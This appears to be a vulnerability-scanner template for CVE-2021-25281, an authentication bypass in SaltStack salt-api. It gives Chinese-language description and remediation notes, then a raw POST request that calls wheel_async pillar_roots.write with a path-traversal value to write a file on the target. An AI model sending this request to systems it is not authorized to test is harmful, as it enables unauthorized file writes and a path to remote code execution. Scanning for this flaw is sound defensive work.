id: CVE-2021-25281
info:
  name: SaltStack Salt <3002.5 - Auth Bypass
  author:
  - l0ne1y
  tags:
  - cve
  - cve2021
  - saltapi
  - rce
  - saltstack
  - unauth
  description: |-
    SaltStack SaltAPI wheel_async未授权访问漏洞
    Saltstack SaltStack Salt是SaltStack（Saltstack）公司的一套开源的用于管理基础架构的工具。该工具提供配置管理、远程执行等功能。

    SaltStack Salt before 3002.5 存在安全漏洞，该漏洞源于salt-api不支持eauth凭据。攻击者可利用该漏洞可以远程运行主机上的任何模块。
  reference:
  - http://hackdig.com/02/hack-283902.htm
  - https://dozer.nz/posts/saltapi-vulns
  - https://nvd.nist.gov/vuln/detail/cve-2021-25281
  - https://github.com/saltstack/salt/releases
  - https://www.saltstack.com/blog/active-saltstack-cve-announced-2021-jan-21/
  severity: critical
  classification:
    cve-id:
    - cve-2021-25281
    cwe-id:
    - cwe-287
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
  remediation: |-
    官方修复方案：
    1.目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    https://saltproject.io/security_announcements/active-saltstack-cve-release-2021-feb-25/
requests:
- matchers:
  - type: word
    condition: and
    part: body
    words:
    - return
    - tag
    - jid
    - salt
    - wheel
  - type: status
    status:
    - 200
  matchers-condition: and
  raw:
  - |
    POST /run HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/json

    {"client":"wheel_async","fun":"pillar_roots.write","data":"testing","path":"../../../../../../../tmp/testing","username":"1","password":"1","eauth":"pam"}
